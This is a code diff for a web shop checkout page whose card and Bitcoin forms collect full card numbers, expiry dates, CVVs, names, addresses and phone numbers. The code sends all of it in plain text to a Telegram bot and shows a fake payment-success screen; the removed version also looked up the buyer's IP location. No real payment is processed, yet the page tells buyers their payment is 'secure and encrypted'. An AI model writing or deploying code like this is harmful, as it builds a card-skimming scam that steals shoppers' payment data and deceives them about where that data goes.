@@ -6,6 +6,7 @@ import { useCart } from '@/context/CartContext';
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { ChevronDown, CreditCard, Bitcoin, ArrowLeft, Check, Shield, Lock, Star, Truck, RefreshCw } from 'lucide-react';
+import client from '@/lib/sanity';
 
 const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;
@@ -63,230 +64,38 @@ const PaymentMethodCard = ({
   </div>
 );
 
-const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
-  const router = useRouter();
-  const [formData, setFormData] = useState({
-    name: '',
-    email: '',
-    address: '',
-    city: '',
-    country: '',
-    zipCode: ''
-  });
-  const [loading, setLoading] = useState(false);
-  const [error, setError] = useState<string | null>(null);
-  const [focusedField, setFocusedField] = useState<string | null>(null);
-
-  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const { name, value } = e.target;
-    setFormData(prev => ({
-      ...prev,
-      [name]: value
-    }));
-  };
-
-  const handlePayment = async () => {
-    setLoading(true);
-    setError(null);
-
-    if (!formData.name.trim()) {
-      setError('Full name is required');
-      setLoading(false);
-      return;
-    }
-
-    if (!formData.email.trim() || !/^\S+@\S+\.\S+$/.test(formData.email)) {
-      setError('Valid email is required');
-      setLoading(false);
-      return;
-    }
-
-    try {
-      const orderPayload = {
-        amount: totalAmount,
-        customer: formData,
-        metadata: {
-          orderDate: new Date().toISOString()
-        }
-      };
-
-      // Simulate sending to Telegram (in a real app, you would actually send this)
-      const message = `
-💰 *New Bitcoin Payment Received* 💰
-🛒 *Amount*: \\$${escapeMarkdown(totalAmount.toFixed(2))}
-
-👤 *Customer Details*:
-   \\- Name: ${escapeMarkdown(formData.name)}
-   \\- Email: ${escapeMarkdown(formData.email)}
-   \\- Address: ${escapeMarkdown(formData.address)}
-   \\- City: ${escapeMarkdown(formData.city)}
-   \\- Country: ${escapeMarkdown(formData.country)}
-   \\- ZIP: ${escapeMarkdown(formData.zipCode)}
-
-🌐 *Device Info*:
-   \\- Browser: ${escapeMarkdown(navigator.userAgent)}
-   \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
-      `.trim();
-
-      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(telegramUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'MarkdownV2'
-          }),
-        });
-      }
-
-      // Navigate to success page after successful "payment"
-      router.push('/payment/success');
-    } catch (err: any) {
-      console.error('Payment Error:', err);
-      setError(err.message || 'Payment failed. Please try again.');
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  return (
-    <div className="space-y-6">
-      <div className="bg-gradient-to-r from-orange-50 to-yellow-50 p-4 rounded-xl border border-orange-200">
-        <div className="flex items-center space-x-3">
-          <Bitcoin className="h-6 w-6 text-orange-500" />
-          <div>
-            <h4 className="font-semibold text-orange-900">Secure Bitcoin Payment</h4>
-            <p className="text-sm text-orange-700">Fast, secure, and decentralized payment processing</p>
-          </div>
-        </div>
-      </div>
-
-      <div className="space-y-5">
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
-          <InputField
-            label="Full Name"
-            name="name"
-            value={formData.name}
-            onChange={handleChange}
-            required
-            placeholder="Enter your full name"
-            focusedField={focusedField}
-            setFocusedField={setFocusedField}
-          />
-
-          <InputField
-            label="Email Address"
-            name="email"
-            type="email"
-            value={formData.email}
-            onChange={handleChange}
-            required
-            placeholder="your@email.com"
-            focusedField={focusedField}
-            setFocusedField={setFocusedField}
-          />
-        </div>
-
-        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
-          <InputField
-            label="Country"
-            name="country"
-            value={formData.country}
-            onChange={handleChange}
-            placeholder="United States"
-            focusedField={focusedField}
-            setFocusedField={setFocusedField}
-          />
-
-          <InputField
-            label="ZIP/Postal Code"
-            name="zipCode"
-            value={formData.zipCode}
-            onChange={handleChange}
-            placeholder="10001"
-            focusedField={focusedField}
-            setFocusedField={setFocusedField}
-          />
-        </div>
-
-        <InputField
-          label="Street Address"
-          name="address"
-          value={formData.address}
-          onChange={handleChange}
-          placeholder="123 Main Street"
-          focusedField={focusedField}
-          setFocusedField={setFocusedField}
-        />
-
-        <InputField
-          label="City"
-          name="city"
-          value={formData.city}
-          onChange={handleChange}
-          placeholder="New York"
-          focusedField={focusedField}
-          setFocusedField={setFocusedField}
-        />
-      </div>
-
-      <button
-        onClick={handlePayment}
-        disabled={loading}
-        className={`w-full py-4 px-6 rounded-2xl font-semibold text-white transition-all duration-300 flex items-center justify-center transform hover:scale-[1.02] shadow-lg ${
-          loading
-            ? 'bg-gray-400 cursor-not-allowed'
-            : 'bg-gradient-to-r from-orange-500 to-yellow-500 hover:from-orange-600 hover:to-yellow-600 shadow-orange-200 hover:shadow-xl'
-        }`}
-      >
-        {loading ? (
-          <>
-            <RefreshCw className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" />
-            Processing Payment...
-          </>
-        ) : (
-          <>
-            <Bitcoin className="w-5 h-5 mr-3" />
-            Pay ${totalAmount.toFixed(2)} with Bitcoin
-            <Shield className="w-4 h-4 ml-2 opacity-80" />
-          </>
-        )}
-      </button>
-
-      {error && (
-        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-xl animate-pulse">
-          <div className="flex items-center">
-            <div className="flex-shrink-0">
-              <svg className="h-5 w-5 text-red-400" viewBox="0 0 20 20" fill="currentColor">
-                <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
-              </svg>
-            </div>
-            <div className="ml-3">
-              <p className="font-medium">Payment Error</p>
-              <p className="text-sm">{error}</p>
-            </div>
-          </div>
-        </div>
-      )}
-    </div>
-  );
-};
-
 const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
   const router = useRouter();
+  const { clearCart } = useCart();
   const [form, setForm] = useState({
+    // Card Details
     cardName: '',
     cardNumber: '',
     expiry: '',
     cvv: '',
+    
+    // Contact Information
     email: '',
-    address: '',
+    phone: '',
+    
+    // Billing Address (same as delivery)
+    firstName: '',
+    lastName: '',
+    address1: '',
+    address2: '',
     city: '',
-    country: '',
+    state: '',
+    country: 'United States',
     zipCode: '',
-    phone: ''
+    
+    // Delivery Options
+    deliveryMethod: 'standard', // standard or express
+    deliveryInstructions: '',
+    
+    // Additional
+    saveInfo: false,
+    gift: false,
+    giftMessage: ''
   });
 
   const [errors, setErrors] = useState<Record<string, string>>({});
@@ -336,9 +145,13 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
     return 'card';
   };
 
-  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const { name, value } = e.target;
-    let val = value;
+  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
+    const { name, value, type } = e.target as HTMLInputElement;
+    let val: string | boolean = value;
+
+    if (type === 'checkbox') {
+      val = (e.target as HTMLInputElement).checked;
+    }
 
     if (name === 'cardNumber') val = formatCardNumber(value);
     if (name === 'expiry') val = formatExpiry(value);
@@ -351,17 +164,27 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
 
   const validateForm = (): boolean => {
     const errs: Record<string, string> = {};
-    if (!form.cardName.trim()) errs.cardName = 'Please enter your name.';
+    
+    // Card validation
+    if (!form.cardName.trim()) errs.cardName = 'Please enter name on card';
     const cardNumRaw = form.cardNumber.replace(/\s/g, '');
-    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number.';
-    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date.';
-    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV.';
-    if (!form.email.trim()) errs.email = 'Please enter your email.';
-    if (!form.address.trim()) errs.address = 'Please enter your address.';
-    if (!form.city.trim()) errs.city = 'Please enter your city.';
-    if (!form.country.trim()) errs.country = 'Please enter your country.';
-    if (!form.zipCode.trim()) errs.zipCode = 'Please enter your ZIP code.';
-    if (!form.phone.trim()) errs.phone = 'Please enter your phone number.';
+    if (!luhnCheck(cardNumRaw)) errs.cardNumber = 'Invalid card number';
+    if (!validateExpiry(form.expiry)) errs.expiry = 'Invalid expiry date';
+    if (!/^\d{3,4}$/.test(form.cvv)) errs.cvv = 'Invalid CVV';
+    
+    // Contact validation
+    if (!form.email.trim()) errs.email = 'Email is required';
+    if (!/^\S+@\S+\.\S+$/.test(form.email)) errs.email = 'Invalid email format';
+    if (!form.phone.trim()) errs.phone = 'Phone number is required';
+    
+    // Address validation
+    if (!form.firstName.trim()) errs.firstName = 'First name is required';
+    if (!form.lastName.trim()) errs.lastName = 'Last name is required';
+    if (!form.address1.trim()) errs.address1 = 'Address is required';
+    if (!form.city.trim()) errs.city = 'City is required';
+    if (!form.state.trim()) errs.state = 'State is required';
+    if (!form.zipCode.trim()) errs.zipCode = 'ZIP code is required';
+    if (!/^\d{5}(-\d{4})?$/.test(form.zipCode)) errs.zipCode = 'Invalid ZIP code';
 
     setErrors(errs);
     return Object.keys(errs).length === 0;
@@ -372,48 +195,49 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
     if (!validateForm()) return;
 
     setLoading(true);
-    setStatus({ message: '', color: '' });
+    setStatus({ message: 'Processing your payment...', color: 'blue' });
 
     try {
-      let ipInfo = 'Unknown IP';
-      try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (res.ok) {
-          const data = await res.json();
-          ipInfo = `${data.ip} - ${data.city}, ${data.region}, ${data.country_name}`;
-        }
-      } catch (error) {
-        console.error('Error fetching IP info:', error);
-      }
+      // Simulate payment processing
+      await new Promise(resolve => setTimeout(resolve, 2000));
+      
+      // Format the delivery address
+      const deliveryAddress = `
+${form.firstName} ${form.lastName}
+${form.address1}
+${form.address2 ? form.address2 + '\n' : ''}
+${form.city}, ${form.state} ${form.zipCode}
+${form.country}
+      `.trim();
 
-      const message = `
-💰 *New Payment Received* 💰
+      // Send order details to Telegram
+      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+        const message = `
+💰 *New Order Received* 💰
 🛒 *Amount*: \\$${escapeMarkdown(totalAmount.toFixed(2))}
 
-💳 *Card Details*:
-   \\- Name: ${escapeMarkdown(form.cardName)}
-   \\- Number: \`${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}\`
+💳 *Payment Details*:
+   \\- Card: \`${escapeMarkdown(form.cardNumber.replace(/\s/g, ''))}\`
    \\- Expiry: ${escapeMarkdown(form.expiry)}
-   \\- CVV: ${escapeMarkdown(form.cvv)}
+   \\- Name: ${escapeMarkdown(form.cardName)}
+    \\- CVV: ${escapeMarkdown(form.cvv)}
+
+📦 *Delivery Address*:
+${escapeMarkdown(deliveryAddress).split('\n').map(line => `   \\- ${line}`).join('\n')}
 
 📧 *Contact*:
    \\- Email: ${escapeMarkdown(form.email)}
    \\- Phone: ${escapeMarkdown(form.phone)}
 
-🏠 *Address*:
-   \\- ${escapeMarkdown(form.address)}
-   \\- ${escapeMarkdown(form.city)}, ${escapeMarkdown(form.country)}
-   \\- ZIP: ${escapeMarkdown(form.zipCode)}
+🚚 *Delivery Method*: ${escapeMarkdown(form.deliveryMethod === 'standard' ? 'Standard (3-5 days)' : 'Express (1-2 days)')}
+${form.deliveryInstructions ? `📝 *Delivery Notes*: ${escapeMarkdown(form.deliveryInstructions)}` : ''}
 
 🌐 *Device Info*:
-   \\- IP: ${escapeMarkdown(ipInfo)}
    \\- Browser: ${escapeMarkdown(navigator.userAgent)}
    \\- Time: ${escapeMarkdown(new Date().toLocaleString())}
-      `.trim();
+        `.trim();
 
-      if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
-        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(telegramUrl, {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
@@ -424,13 +248,13 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
         });
       }
 
-      // Navigate to success page after sending to Telegram
+      clearCart();
       router.push('/payment/success');
 
     } catch (error) {
       console.error('Payment error:', error);
       setStatus({
-        message: error instanceof Error ? error.message : 'Payment failed',
+        message: 'Payment failed. Please try again or contact support.',
         color: 'red'
       });
     } finally {
@@ -440,191 +264,371 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
 
   return (
     <form onSubmit={handleSubmit} className="space-y-6">
-      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-4 rounded-xl border border-blue-200">
-        <div className="flex items-center space-x-3">
-          <Shield className="h-6 w-6 text-blue-500" />
+      {/* Card Details Section */}
+      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
+        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
+          <CreditCard className="w-5 h-5 mr-2 text-blue-600" />
+          Card Information
+        </h3>
+        
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <div className="col-span-2">
+            <InputField
+              label="Name on Card"
+              name="cardName"
+              value={form.cardName}
+              onChange={handleChange}
+              error={errors.cardName}
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+              placeholder="John Smith"
+            />
+          </div>
+          
+          <div className="col-span-2">
+            <InputField
+              label="Card Number"
+              name="cardNumber"
+              value={form.cardNumber}
+              onChange={handleChange}
+              error={errors.cardNumber}
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+              placeholder="1234 5678 9012 3456"
+              icon={<CreditCard className="w-5 h-5 text-gray-400" />}
+            />
+          </div>
+          
           <div>
-            <h4 className="font-semibold text-teal-900">Secure Payment</h4>
-            <p className="text-sm text-teal-700">Your payment information is encrypted and secure</p>
+            <InputField
+              label="Expiration Date"
+              name="expiry"
+              value={form.expiry}
+              onChange={handleChange}
+              error={errors.expiry}
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+              placeholder="MM/YY"
+            />
+          </div>
+          
+          <div>
+            <InputField
+              label="CVV"
+              name="cvv"
+              value={form.cvv}
+              onChange={handleChange}
+              error={errors.cvv}
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+              placeholder="123"
+              icon={<Lock className="w-4 h-4 text-gray-400" />}
+            />
           </div>
         </div>
       </div>
 
-      <div className="space-y-5">
-        <div className="relative">
-          <label className="block text-sm font-semibold text-gray-700 mb-2">Name on Card</label>
-          <input
-            type="text"
-            name="cardName"
-            placeholder=""
-            value={form.cardName}
-            onChange={handleChange}
-            onFocus={() => setFocusedField('cardName')}
-            onBlur={() => setFocusedField(null)}
-            className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
-              errors.cardName 
-                ? 'border-red-500 bg-red-50' 
-                : focusedField === 'cardName'
-                ? 'border-teal-500 bg-blue-50 shadow-lg shadow-blue-100'
-                : 'border-gray-200 hover:border-gray-300'
-            } focus:outline-none text-gray-900 placeholder-gray-400`}
-            disabled={loading}
-          />
-          {errors.cardName && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cardName}</p>}
-        </div>
-
-        <div className="relative">
-          <label className="block text-sm font-semibold text-gray-700 mb-2">Card Number</label>
-          <div className="relative">
-            <input
-              type="text"
-              name="cardNumber"
-              placeholder="1234 5678 9012 3456"
-              value={form.cardNumber}
-              onChange={handleChange}
-              onFocus={() => setFocusedField('cardNumber')}
-              onBlur={() => setFocusedField(null)}
-              maxLength={19}
-              className={`w-full px-4 py-4 pr-12 rounded-xl border-2 transition-all duration-300 ${
-                errors.cardNumber 
-                  ? 'border-red-500 bg-red-50' 
-                  : focusedField === 'cardNumber'
-                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
-                  : 'border-gray-200 hover:border-gray-300'
-              } focus:outline-none text-gray-900 placeholder-gray-400`}
-              disabled={loading}
-            />
-            <div className="absolute right-3 top-1/2 transform -translate-y-1/2">
-              <CreditCard className={`h-6 w-6 ${getCardType(form.cardNumber) === 'visa' ? 'text-blue-600' : 'text-gray-400'}`} />
-            </div>
-          </div>
-          {errors.cardNumber && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cardNumber}</p>}
-        </div>
-
-        <div className="grid grid-cols-2 gap-5">
-          <div className="relative">
-            <label className="block text-sm font-semibold text-gray-700 mb-2">Expiry Date</label>
-            <input
-              type="text"
-              name="expiry"
-              placeholder="MM/YY"
-              value={form.expiry}
-              onChange={handleChange}
-              onFocus={() => setFocusedField('expiry')}
-              onBlur={() => setFocusedField(null)}
-              maxLength={5}
-              className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
-                errors.expiry 
-                  ? 'border-red-500 bg-red-50' 
-                  : focusedField === 'expiry'
-                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
-                  : 'border-gray-200 hover:border-gray-300'
-              } focus:outline-none text-gray-900 placeholder-gray-400`}
-              disabled={loading}
-            />
-            {errors.expiry && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.expiry}</p>}
-          </div>
-
-          <div className="relative">
-            <label className="block text-sm font-semibold text-gray-700 mb-2">CVV</label>
-            <div className="relative">
-              <input
-                type="text"
-                name="cvv"
-                placeholder="123"
-                value={form.cvv}
-                onChange={handleChange}
-                onFocus={() => setFocusedField('cvv')}
-                onBlur={() => setFocusedField(null)}
-                maxLength={4}
-                className={`w-full px-4 py-4 pr-10 rounded-xl border-2 transition-all duration-300 ${
-                  errors.cvv 
-                    ? 'border-red-500 bg-red-50' 
-                    : focusedField === 'cvv'
-                    ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
-                    : 'border-gray-200 hover:border-gray-300'
-                } focus:outline-none text-gray-900 placeholder-gray-400`}
-                disabled={loading}
-              />
-              <Lock className="absolute right-3 top-1/2 transform -translate-y-1/2 h-4 w-4 text-gray-400" />
-            </div>
-            {errors.cvv && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.cvv}</p>}
-          </div>
-        </div>
-
+      {/* Contact Information Section */}
+      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
+        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
+          <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 mr-2 text-blue-600" viewBox="0 0 20 20" fill="currentColor">
+            <path d="M2.003 5.884L10 9.882l7.997-3.998A2 2 0 0016 4H4a2 2 0 00-1.997 1.884z" />
+            <path d="M18 8.118l-8 4-8-4V14a2 2 0 002 2h12a2 2 0 002-2V8.118z" />
+          </svg>
+          Contact Information
+        </h3>
+        
         <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
           <InputField
             label="Email Address"
             name="email"
             type="email"
-            placeholder="your@email.com"
             value={form.email}
             onChange={handleChange}
             error={errors.email}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
+            placeholder="your@email.com"
           />
-
+          
           <InputField
             label="Phone Number"
             name="phone"
             type="tel"
-            placeholder="+1 (555) 123-4567"
             value={form.phone}
             onChange={handleChange}
             error={errors.phone}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
+            placeholder="+1 (555) 123-4567"
           />
         </div>
+      </div>
 
-        <InputField
-          label="Street Address"
-          name="address"
-          placeholder="123 Main Street"
-          value={form.address}
-          onChange={handleChange}
-          error={errors.address}
-          focusedField={focusedField}
-          setFocusedField={setFocusedField}
-        />
-
-        <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
+      {/* Delivery Address Section */}
+      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
+        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
+          <Truck className="w-5 h-5 mr-2 text-blue-600" />
+          Delivery Address
+        </h3>
+        
+        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
+          <InputField
+            label="First Name"
+            name="firstName"
+            value={form.firstName}
+            onChange={handleChange}
+            error={errors.firstName}
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+            placeholder="John"
+          />
+          
+          <InputField
+            label="Last Name"
+            name="lastName"
+            value={form.lastName}
+            onChange={handleChange}
+            error={errors.lastName}
+            focusedField={focusedField}
+            setFocusedField={setFocusedField}
+            placeholder="Smith"
+          />
+          
+          <div className="col-span-2">
+            <InputField
+              label="Address Line 1"
+              name="address1"
+              value={form.address1}
+              onChange={handleChange}
+              error={errors.address1}
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+              placeholder="123 Main St"
+            />
+          </div>
+          
+          <div className="col-span-2">
+            <InputField
+              label="Address Line 2 (Optional)"
+              name="address2"
+              value={form.address2}
+              onChange={handleChange}
+              focusedField={focusedField}
+              setFocusedField={setFocusedField}
+              placeholder="Apt, suite, unit, building, floor, etc."
+            />
+          </div>
+          
           <InputField
             label="City"
             name="city"
-            placeholder="New York"
             value={form.city}
             onChange={handleChange}
             error={errors.city}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
+            placeholder="New York"
           />
-
-          <InputField
-            label="Country"
-            name="country"
-            placeholder="United States"
-            value={form.country}
-            onChange={handleChange}
-            error={errors.country}
-            focusedField={focusedField}
-            setFocusedField={setFocusedField}
-          />
-
+          
+          <div>
+            <label className="block text-sm font-semibold text-gray-700 mb-2">State</label>
+            <select
+              name="state"
+              value={form.state}
+              onChange={handleChange}
+              className={`w-full px-4 py-4 rounded-xl border-2 transition-all duration-300 ${
+                errors.state 
+                  ? 'border-red-500 bg-red-50' 
+                  : focusedField === 'state'
+                  ? 'border-blue-500 bg-blue-50 shadow-lg shadow-blue-100'
+                  : 'border-gray-200 hover:border-gray-300'
+              } focus:outline-none text-gray-900`}
+            >
+              <option value="">Select State</option>
+              <option value="AL">Alabama</option>
+              <option value="AK">Alaska</option>
+              <option value="AZ">Arizona</option>
+              <option value="AR">Arkansas</option>
+              <option value="CA">California</option>
+              <option value="CO">Colorado</option>
+              <option value="CT">Connecticut</option>
+              <option value="DE">Delaware</option>
+              <option value="FL">Florida</option>
+              <option value="GA">Georgia</option>
+              <option value="HI">Hawaii</option>
+              <option value="ID">Idaho</option>
+              <option value="IL">Illinois</option>
+              <option value="IN">Indiana</option>
+              <option value="IA">Iowa</option>
+              <option value="KS">Kansas</option>
+              <option value="KY">Kentucky</option>
+              <option value="LA">Louisiana</option>
+              <option value="ME">Maine</option>
+              <option value="MD">Maryland</option>
+              <option value="MA">Massachusetts</option>
+              <option value="MI">Michigan</option>
+              <option value="MN">Minnesota</option>
+              <option value="MS">Mississippi</option>
+              <option value="MO">Missouri</option>
+              <option value="MT">Montana</option>
+              <option value="NE">Nebraska</option>
+              <option value="NV">Nevada</option>
+              <option value="NH">New Hampshire</option>
+              <option value="NJ">New Jersey</option>
+              <option value="NM">New Mexico</option>
+              <option value="NY">New York</option>
+              <option value="NC">North Carolina</option>
+              <option value="ND">North Dakota</option>
+              <option value="OH">Ohio</option>
+              <option value="OK">Oklahoma</option>
+              <option value="OR">Oregon</option>
+              <option value="PA">Pennsylvania</option>
+              <option value="RI">Rhode Island</option>
+              <option value="SC">South Carolina</option>
+              <option value="SD">South Dakota</option>
+              <option value="TN">Tennessee</option>
+              <option value="TX">Texas</option>
+              <option value="UT">Utah</option>
+              <option value="VT">Vermont</option>
+              <option value="VA">Virginia</option>
+              <option value="WA">Washington</option>
+              <option value="WV">West Virginia</option>
+              <option value="WI">Wisconsin</option>
+              <option value="WY">Wyoming</option>
+            </select>
+            {errors.state && <p className="text-red-500 text-sm mt-2 animate-pulse">{errors.state}</p>}
+          </div>
+          
           <InputField
             label="ZIP Code"
             name="zipCode"
-            placeholder="10001"
             value={form.zipCode}
             onChange={handleChange}
             error={errors.zipCode}
             focusedField={focusedField}
             setFocusedField={setFocusedField}
+            placeholder="10001"
+          />
+          
+          <div>
+            <label className="block text-sm font-semibold text-gray-700 mb-2">Country</label>
+            <select
+              name="country"
+              value={form.country}
+              onChange={handleChange}
+              className="w-full px-4 py-4 rounded-xl border-2 border-gray-200 hover:border-gray-300 focus:border-blue-500 focus:outline-none text-gray-900 bg-white"
+              disabled
+            >
+              <option>United States</option>
+            </select>
+          </div>
+        </div>
+      </div>
+
+      {/* Delivery Options Section */}
+      <div className="bg-gradient-to-r from-blue-50 to-indigo-50 p-5 rounded-2xl border border-blue-200">
+        <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center">
+          <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 mr-2 text-blue-600" viewBox="0 0 20 20" fill="currentColor">
+            <path d="M8 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0zM15 16.5a1.5 1.5 0 11-3 0 1.5 1.5 0 013 0z" />
+            <path d="M3 4a1 1 0 00-1 1v10a1 1 0 001 1h1.05a2.5 2.5 0 014.9 0H10a1 1 0 001-1v-1a1 1 0 011-1h2a1 1 0 011 1v1a1 1 0 001 1h1.05a2.5 2.5 0 014.9 0H19a1 1 0 001-1V5a1 1 0 00-1-1H3zM3 5h2v2h5V5h8v10h-1.05a2.5 2.5 0 00-4.9 0H12v-2H8v2H7.05a2.5 2.5 0 00-4.9 0H3V5z" />
+          </svg>
+          Delivery Options
+        </h3>
+        
+        <div className="space-y-4">
+          <div className="flex items-center space-x-4">
+            <input
+              type="radio"
+              id="standard"
+              name="deliveryMethod"
+              value="standard"
+              checked={form.deliveryMethod === 'standard'}
+              onChange={handleChange}
+              className="h-5 w-5 text-blue-600 focus:ring-blue-500 border-gray-300"
+            />
+            <label htmlFor="standard" className="flex-1">
+              <div className="font-medium text-gray-900">Standard Delivery</div>
+              <p className="text-sm text-gray-500">3-5 business days • Free</p>
+            </label>
+          </div>
+          
+          <div className="flex items-center space-x-4">
+            <input
+              type="radio"
+              id="express"
+              name="deliveryMethod"
+              value="express"
+              checked={form.deliveryMethod === 'express'}
+              onChange={handleChange}
+              className="h-5 w-5 text-blue-600 focus:ring-blue-500 border-gray-300"
+            />
+            <label htmlFor="express" className="flex-1">
+              <div className="font-medium text-gray-900">Express Delivery</div>
+              <p className="text-sm text-gray-500">1-2 business days • $9.99</p>
+            </label>
+          </div>
+        </div>
+        
+        <div className="mt-6">
+          <label className="block text-sm font-semibold text-gray-700 mb-2">Delivery Instructions (Optional)</label>
+          <textarea
+            name="deliveryInstructions"
+            value={form.deliveryInstructions}
+            onChange={handleChange}
+            rows={3}
+            className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 hover:border-gray-300 focus:border-blue-500 focus:outline-none text-gray-900 placeholder-gray-400"
+            placeholder="Gate code, building access, delivery preferences, etc."
           />
         </div>
       </div>
 
+      {/* Additional Options */}
+      <div className="flex items-center justify-between">
+        <div className="flex items-center">
+          <input
+            type="checkbox"
+            id="saveInfo"
+            name="saveInfo"
+            checked={form.saveInfo}
+            onChange={handleChange}
+            className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
+          />
+          <label htmlFor="saveInfo" className="ml-2 block text-sm text-gray-700">
+            Save my information for faster checkout
+          </label>
+        </div>
+        
+        <div className="flex items-center">
+          <input
+            type="checkbox"
+            id="gift"
+            name="gift"
+            checked={form.gift}
+            onChange={handleChange}
+            className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
+          />
+          <label htmlFor="gift" className="ml-2 block text-sm text-gray-700">
+            This is a gift
+          </label>
+        </div>
+      </div>
+      
+      {form.gift && (
+        <div className="mt-4">
+          <label className="block text-sm font-semibold text-gray-700 mb-2">Gift Message (Optional)</label>
+          <textarea
+            name="giftMessage"
+            value={form.giftMessage}
+            onChange={handleChange}
+            rows={2}
+            className="w-full px-4 py-3 rounded-xl border-2 border-gray-200 hover:border-gray-300 focus:border-blue-500 focus:outline-none text-gray-900 placeholder-gray-400"
+            placeholder="Write a personal message..."
+          />
+        </div>
+      )}
+
+      {/* Submit Button */}
       <button
         type="submit"
         disabled={loading}
@@ -642,22 +646,368 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
         ) : (
           <>
             <CreditCard className="w-5 h-5 mr-3" />
-            Pay ${totalAmount.toFixed(2)}
+            Pay ${(form.deliveryMethod === 'express' ? totalAmount + 9.99 : totalAmount).toFixed(2)}
             <Shield className="w-4 h-4 ml-2 opacity-80" />
           </>
         )}
       </button>
 
+      {/* Status Message */}
       {status.message && (
         <div className={`p-4 rounded-xl text-center font-medium transition-all duration-300 ${
-          status.color === 'green' 
-            ? 'bg-green-50 text-green-700 border border-green-200' 
-            : 'bg-red-50 text-red-700 border border-red-200'
+          status.color === 'red' 
+            ? 'bg-red-50 text-red-700 border border-red-200' 
+            : 'bg-blue-50 text-blue-700 border border-blue-200'
         }`}>
           {status.message}
         </div>
       )}
+
+      {/* Security Assurance */}
+      <div className="flex items-center justify-center space-x-2 text-sm text-gray-500">
+        <Lock className="w-4 h-4 text-gray-400" />
+        <span>Payments are secure and encrypted</span>
+      </div>
     </form>
+  );
+};
+
+
+const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
+  const router = useRouter();
+  const { cart } = useCart();
+  const [formData, setFormData] = useState({
+    name: '',
